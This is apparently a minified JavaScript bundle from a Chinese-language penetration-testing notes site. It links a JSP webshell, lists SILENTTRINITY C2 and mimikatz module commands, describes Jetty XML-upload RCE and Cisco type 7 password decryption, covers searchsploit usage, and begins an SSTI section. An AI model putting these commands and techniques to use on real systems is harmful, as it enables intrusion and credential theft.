                              \u3010jsp File browser 1.2\u3011\uFF1Ahttps://github.com/tennc/webshell/blob/master/jsp/jspbrowser/Browser.jsp

              \u3010SILENTTRINITY\u3011agent\u4EE3\u7406

                  \u8D44\u6599\uFF1A
                      \u76F8\u5173\u6F14\u793A\u89C6\u9891\uFF1Ahttps://www.youtube.com/watch?v=-O3SPrYhAMo
                  \u4ECB\u7ECD\uFF1A
                      \u662F\u4E00\u6B3E\u65B0\u578B\u7684\u3010\u540E\u6E17\u900Fpost-exploitation\u3011agent\u4EE3\u7406\u5DE5\u5177\u3002\u4F7F\u7528 Python, IronPython, C#/.NET \u5F00\u53D1\u3002
                      \u56FD\u5185\u7684\u666E\u53CA\u5EA6\uFF0C\u611F\u89C9\u4E5F\u8FD8\u662F\u53EF\u4EE5\u7684\u3002
                  \u5B89\u88C5\u65B9\u5F0F\uFF1A
                      1.git\u62C9\u53D6  2.\u5B89\u88C5\u4F9D\u8D56
                  \u542F\u52A8\uFF1A
                      python  st.py  2>  /dev/null
                  \u5E38\u7528\u6307\u4EE4\uFF1A
                      use  http
                      set  BindIP  <IP\u5730\u5740>
                      start
                      stagers\uFF0C\u5207\u6362

                          \u4E0B\u5C5E\u5B50\u547D\u4EE4

                              use  wmic
                              generate  http

                      list\uFF0C\u5217\u4E3E\u6A21\u5757
                      modules\uFF0C\u67E5\u770B\u3010\u6A21\u5757\u3011

                      use  <\u6A21\u5757\u5982mimikatz>
                          123
                      set  Command  <\u5177\u4F53\u547D\u4EE4>
                      run  <\u8FD9\u4E2A\u662F\u4EC0\u4E48\uFF1F\uFF1F\uFF1F>

                  \u652F\u6301\u7684\u989D\u5916\u9009\u9879\uFF1A
                      \u3010mimikatz\u3011
                          123

                      \u3010execute-assembly\u3011
                          123


          `))},{name:"Jetty\uFF08 Jenkins\u7684\u4E3B\u4F53\u6846\u67B6 \uFF09",content:Promise.all([]).then(function(I){var g=Object(S.a)(I);return r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u4ECB\u7ECD\uFF1A
                  Jetty\uFF0C\u7531Java\u8FDB\u884C\u5F00\u53D1\u3002\u662F\u8F7B\u91CF\u7EA7\u7684 Web\u670D\u52A1\u5668 \u548C Servlet\u5F15\u64CE \u3002
                      \u5B83\u7684\u6700\u5927\u7279\u70B9\u662F\uFF1A\u53EF\u4EE5\u5F88\u65B9\u4FBF\u7684\u4F5C\u4E3A\u5D4C\u5165\u5F0F\u670D\u52A1\u5668\u3002

                  \u6700\u5E38\u89C1\u7684\u573A\u666F\uFF1A
                      \u5C31\u662F\u3010Jenkins\u3011  \u662F\u7528\u8FD9\u4E2A\u5199\u7684\u3002

              \u5982\u679C\u4F60 \u4E0A\u4F20\u4E86\u4E00\u4E2AXML\u6587\u4EF6 \u5230Jetty\u670D\u52A1\u5668\uFF0C\u4F60\u5C06\u5F97\u5230  \u4E00\u4E2ARCE\u3002
                  \u56E0\u4E3A \u4E00\u4E2A\u65B0\u7684\u3010.xml\u3011\u548C\u3010*.war\u3011\uFF0C\u4F1A\u88AB \u81EA\u52A8\u5904\u7406\u8FD0\u884C\u3002

                  \u5982\u4E0B\u56FE\u6240\u793A\uFF0C\u4E0A\u4F20\u4E00\u4E2AXML\u6587\u4EF6  \u5230\u3010$JETTY_BASE/webapps/\u3011\u76EE\u5F55\uFF0C\u7136\u540E\u4F60\u5C31\u5F97\u5230\u4E86\u4E00\u4E2A Shell \uFF01

              `,`
              `))})},{name:"\u3010Cisco\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          Cisco
              \u5B98\u65B9\uFF0C\u5173\u4E8E\u5404\u79CD\u3010\u52A0\u5BC6\u7C7B\u578B\u3011\u7684\u5165\u95E8\u8BE6\u7EC6\u4ECB\u7ECD\uFF1A
                  https://community.cisco.com/t5/networking-documents/understanding-the-differences-between-the-cisco-password-secret/ta-p/3163238

              Cisco type 7
                  \u5B83\u7C7B\u4F3C\u4E8E\u5728\u4F60\u7684\u914D\u7F6E\u4E2D\u5BF9\u5BC6\u7801\u8FDB\u884C base64 \u7F16\u7801\uFF0C\u6062\u590D\u660E\u6587\u5F88\u7B80\u5355

              secret 5 / type 5


              \u53E6\u5916\u4E00\u6B3E\uFF0C\u5728\u7EBF\u7834\u89E3\u3010Cisco\u3011\u7684\u5DE5\u5177\uFF1A
                  \u3010\u901A\u7528\u578B\u3011\uFF1Ahttps://www.ifm.net.nz/cookbooks/passwordcracker.html
                  \u3010Type 5 \u578B\u3011\uFF1Ahttps://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html


          \u76F8\u5173\u5DE5\u5177\uFF1A

              cisco_pwdecrypt.py
                  https://github.com/axcheron/cisco_pwdecrypt

              ciscot7.py
                  https://github.com/theevilbit/ciscot7

                  python3  ciscot7.py  -d  -p  0242114B0E143F015F5D1E161713
                  python3  ciscot7.py  -d  -p  02375012182C1A1D751618034F36415408


          `))},{name:"\u3010ColorLib\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4E00\u4E2AWordPress\u76F8\u5173\u7684\u3010\u5E93\u3011

          `))},{name:"\u3010OpenNetAdmin\u3011 / \u3010OpenAdmin\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,m.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          OpenNetAdmin
              \u4F5C\u4E3ACMS\u641C\u7D22
              \u7B80\u5199\u300Aona\u300B

              \u914D\u7F6E\u6587\u4EF6\uFF1A
                  \u6570\u636E\u5E93\u914D\u7F6E\u6587\u4EF6
                      \u53C2\u8003\u8D44\u6599\uFF1Ahttps://opennetadmin.com/forum_archive/4/t-85.html

                      \u5B58\u653E\u5730\u5740\uFF1A\u3010ona/local/config/database_settings.inc.php\u3011\u3002


          `))}]},p=F},Y8sb:function(H,d,n){H.exports={question_search_Wra:"question_search_Wra___1hT4t"}},Zqaa:function(H,d,n){H.exports={questionWra:"questionWra___3wwz5"}},bxSD:function(H,d,n){"use strict";n.d(d,"a",function(){return v});var S=n("k1fw"),t=n("jrin"),l=n("q1tI"),r=n.n(l),e=n("NsKX"),u=n.n(e),m=n("TSYQ"),E=n.n(m),F=n("5Dmo"),p=n("3S7+"),I=n("tJVT"),g=n("wlus"),c=n("w5pM"),h=n("JpNU"),w=n("L/3/"),a=n("ysNt"),B=n("wQla");function O(x){var T=a.l.check_isString(x)||B.e.isElement(x);return T}function _(x){var T=arguments.length>1&&arguments[1]!==void 0?arguments[1]:20,R=O(x);return Object(S.a)({},R?{minWidth:"".concat(T,"em")}:{})}var b=function(T){var R=T.item,s=T.size,o=T.dispatch,i=T.my_custom_store.is_\u91D1\u5B57\u5854_tooltip_Inited,f=Object(l.useState)(!1),P=Object(I.a)(f,2),D=P[0],C=P[1];function M(){C(!D)}function L(){return D?"unset":"0"}return r.a.createElement(r.a.Fragment,null,r.a.createElement("h1",{className:E()(u.a.pyramidItem_SubItem_Title),style:Object(S.a)({cursor:"pointer"},s==="medium"?_("\u5047\u8BBE\u662F\u4E00\u4E2A\u5185\u5BB9",15):{}),onClick:function(){M()}},R.name,r.a.createElement("span",{style:{}},r.a.createElement(p.a,{placement:"right",title:"\u53EA\u6709\u81EA\u8EAB\u65E0child\u7684\u8282\u70B9\uFF0C\u624D\u4F1A\u6709\u6700\u5C0F\u5BBD\u5EA6",trigger:i?"contextMenu":"click",onVisibleChange:function(q){q===!0&&o({type:"my_custom_store/sync_set_is_\u91D1\u5B57\u5854_tooltip_Inited",payload:!0})}},D?r.a.createElement(g.a,null):r.a.createElement(c.a,null)))),D&&r.a.createElement("div",{style:{}},r.a.createElement(v,{cfg:R.sub,isChildPyramid:!0})))},y=h.a.getInstance(b,w.a);function j(x,T){var R=O(x)?x.length>0?r.a.createElement("h1",null,x):void 0:r.a.createElement(y,{item:x,size:T});return R}var v=function(T){var R,s,o,i,f,P=T.cfg,D=T.style,C=T.isChildPyramid,M=C===void 0?!1:C,L=T.isOverFlow,J=L===void 0?!1:L,q=T.size,V=q===void 0?"medium":q;function tu(Y){var au={1:"\u2460",2:"\u2461",3:"\u2462",4:"\u2463"}[Y];return r.a.createElement("h3",{className:u.a.pyramidItem_levelTag},au)}return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:E()(u.a.pyramidWra,(R={},Object(t.a)(R,u.a.isChildPyramid,M),Object(t.a)(R,u.a.isOverFlow,J),R)),style:D},r.a.createElement("div",{className:E()(u.a.pyramidLv,u.a.pyramid_lv_1)},(s=P.lv1)===null||s===void 0?void 0:s.map(function(Y){return r.a.createElement("div",{className:E()(u.a.pyramidItem,u.a.pyramid_lv_1_item),style:Object(S.a)(Object(S.a)({},_(Y)),{},{position:"relative"})},j(Y,V),tu(1))})),r.a.createElement("div",{className:E()(u.a.pyramidLv,u.a.pyramid_lv_2)},(o=P.lv2)===null||o===void 0?void 0:o.map(function(Y){return r.a.createElement("div",{className:E()(u.a.pyramidItem,u.a.pyramid_lv_2_item),style:Object(S.a)(Object(S.a)({},_(Y)),{},{position:"relative"})},j(Y,V),tu(2))})),r.a.createElement("div",{className:E()(u.a.pyramidLv,u.a.pyramid_lv_3)},(i=P.lv3)===null||i===void 0?void 0:i.map(function(Y){return r.a.createElement("div",{className:E()(u.a.pyramidItem,u.a.pyramid_lv_3_item),style:Object(S.a)(Object(S.a)({},_(Y)),{},{position:"relative"})},j(Y,V),tu(3))})),r.a.createElement("div",{className:E()(u.a.pyramidLv,u.a.pyramid_lv_4)},(f=P.lv4)===null||f===void 0?void 0:f.map(function(Y){return r.a.createElement("div",{className:E()(u.a.pyramidItem,u.a.pyramid_lv_4_item),style:Object(S.a)(Object(S.a)({},_(Y)),{},{position:"relative"})},j(Y,V),tu(4))}))))}},eFOt:function(H,d,n){"use strict";n.r(d),n.d(d,"ExploitDB_SearchSploit_MetaSploit_MSF_\u624B\u518C",function(){return E});var S=n("ysNt"),t=n("q1tI"),l=n.n(t),r=n("EkZe"),e=n("jJ7j"),u=S.l.singleATag_blank,m={name:"\u3010ExploitDB\u3011_\u3010SearchSploit\u3011_\u3010MetaSploit\u3011_\u3010MSF\u3011_\u624B\u518C",steps:[{name:"\u3010ExploitDB\u3011 / \u3010exploit-db\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5728\u7EBF\u6570\u636E\u5E93

          \u79BB\u7EBF\u6570\u636E\u5E93 / \u672C\u5730\u6570\u636E\u5E93

          `))},{name:"\u3010SearchSploit\u3011    (\u57FA\u4E8E\u3010ExploitDB\u3011)",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u57FA\u672C\u4F7F\u7528\uFF1A
              searchsploit  [\u4EA7\u54C1\u540D\u79F0]  [\u7248\u672C\u53F7]
                  \u626B\u63CF\u51FA\u6765\u7ED3\u679C\uFF0C\u6BD4\u5982\u3010linux/remote/45939.py\u3011
                      \u5176\u5B9E\u7EDF\u4E00\u5728\u76EE\u5F55\u3010/usr/share/exploitdb/exploits/**\u3011\u4E0B\u9762

          \u66F4\u65B0\u5347\u7EA7
              searchsploit  --update
                  \uFF08\u6709\u65F6\u5019\u5305\u4F53\u592A\u5927\uFF0C\u653E\u5728\u672C\u5730\u53CD\u800C\u6CA1\u5FC5\u8981\uFF09

          \u5E38\u89C1\u9009\u9879\uFF1A
              \u3010-x\u3011\uFF0C\u663E\u793A \u5173\u4E8E\u5229\u7528 \u7684\u66F4\u591A\u4FE1\u606F
              \u3010--update\u3011
                  \u5347\u7EA7\u6570\u636E\u5E93



          `))},r.a]},E=m},fHMl:function(H,d,n){"use strict";var S=n("VTBJ"),t=n("q1tI"),l={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M942.2 486.2Q889.47 375.11 816.7 305l-50.88 50.88C807.31 395.53 843.45 447.4 874.7 512 791.5 684.2 673.4 766 512 766q-72.67 0-133.87-22.38L323 798.75Q408 838 512 838q288.3 0 430.2-300.3a60.29 60.29 0 000-51.5zm-63.57-320.64L836 122.88a8 8 0 00-11.32 0L715.31 232.2Q624.86 186 512 186q-288.3 0-430.2 300.3a60.3 60.3 0 000 51.5q56.69 119.4 136.5 191.41L112.48 835a8 8 0 000 11.31L155.17 889a8 8 0 0011.31 0l712.15-712.12a8 8 0 000-11.32zM149.3 512C232.6 339.8 350.7 258 512 258c54.54 0 104.13 9.36 149.12 28.39l-70.3 70.3a176 176 0 00-238.13 238.13l-83.42 83.42C223.1 637.49 183.3 582.28 149.3 512zm246.7 0a112.11 112.11 0 01146.2-106.69L401.31 546.2A112 112 0 01396 512z"}},{tag:"path",attrs:{d:"M508 624c-3.46 0-6.87-.16-10.25-.47l-52.82 52.82a176.09 176.09 0 00227.42-227.42l-52.82 52.82c.31 3.38.47 6.79.47 10.25a111.94 111.94 0 01-112 112z"}}]},name:"eye-invisible",theme:"outlined"},r=l,e=n("6VBw"),u=function(F,p){return t.createElement(e.a,Object(S.a)(Object(S.a)({},F),{},{ref:p,icon:r}))};u.displayName="EyeInvisibleOutlined";var m=d.a=t.forwardRef(u)},h4Gq:function(H,d){H.exports="data:image/png;base64,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"},jEKr:function(H,d,n){"use strict";n.r(d),n.d(d,"NodeJS_SSTI_cfg",function(){return E}),n.d(d,"Java_SSTI_cfg",function(){return F}),n.d(d,"Python_SSTI_cfg",function(){return p}),n.d(d,"PHP_SSTI_cfg",function(){return I}),n.d(d,"\u524D\u7AEFJavaScript_SSTI_cfg",function(){return g}),n.d(d,"Ruby_SSTI_cfg",function(){return c}),n.d(d,"Go_SSTI_cfg",function(){return h}),n.d(d,"SSTI_cfg",function(){return w}),n.d(d,"SSTI_\u6A21\u677F\u6CE8\u5165_\u6A21\u677F\u6E32\u67D3_\u6A21\u677F\u5F15\u64CE_\u624B\u518C",function(){return a});var S=n("q1tI"),t=n.n(S),l=n("ysNt"),r=n("s1IG"),e=n("XjqV"),u=n("jJ7j"),m=l.l.singleATag_blank,E={name:"\u3010Nodejs / Node.js \u2014\u2014\u2014\u2014SSTI\u3011",desc:t.a.createElement(t.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",content:t.a.createElement(t.a.Fragment,null,u.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

        \u4ECB\u7ECD\uFF1A
            Node.js\u662F\u4E00\u79CD\u5F00\u6E90\uFF0C\u8DE8\u5E73\u53F0\uFF0C\u540E\u7AEFJavaScript\u8FD0\u884C\u65F6\u73AF\u5883\uFF0C\u53EF\u7528\u4E8E\u6784\u5EFA    \u53EF\u6269\u5C55\u7684\u7F51\u7EDC\u5E94\u7528\u7A0B\u5E8F\u3002

